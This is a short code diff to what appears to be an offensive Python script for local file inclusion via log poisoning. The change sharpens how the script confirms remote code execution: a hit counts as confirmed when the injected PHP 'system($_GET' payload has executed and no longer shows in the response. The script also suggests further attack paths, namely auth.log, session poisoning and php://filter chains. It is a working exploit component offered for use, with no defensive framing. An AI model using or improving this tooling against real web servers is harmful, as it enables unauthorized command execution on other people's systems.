@@ -49,10 +49,14 @@ def execute(url, cmd, depth):
                 r = requests.get(u, verify=False, timeout=12)
             except Exception:
                 continue
-            # crude success check: the marker token appears in the body
+            body = r.text
             tok = cmd.split()[-1] if cmd.split() else ""
-            if tok and tok in r.text:
-                print(f"[RCE] log={log} depth={d}\n      {u}\n      -> marker '{tok}' present in response.")
+            # Distinguish EXECUTION from mere inclusion/reflection. The marker also travels in the request
+            # (c=echo TOKEN) and a READ sink would echo the log's literal "<?php system($_GET..." verbatim.
+            # Real RCE = the marker OUTPUT is present AND the literal PHP poison is GONE (executed away).
+            poison_shown = ("<?php system($_GET" in body) or ("&lt;?php system($_GET" in body)
+            if tok and tok in body and not poison_shown:
+                print(f"[RCE] log={log} depth={d}\n      {u}\n      -> marker '{tok}' present and the PHP poison executed (§11).")
                 return True
     print("[*] no log path executed the marker. Try: more depth, error.log, SSH auth.log, "
           "session poisoning (§13), or the php://filter chain (§12).")
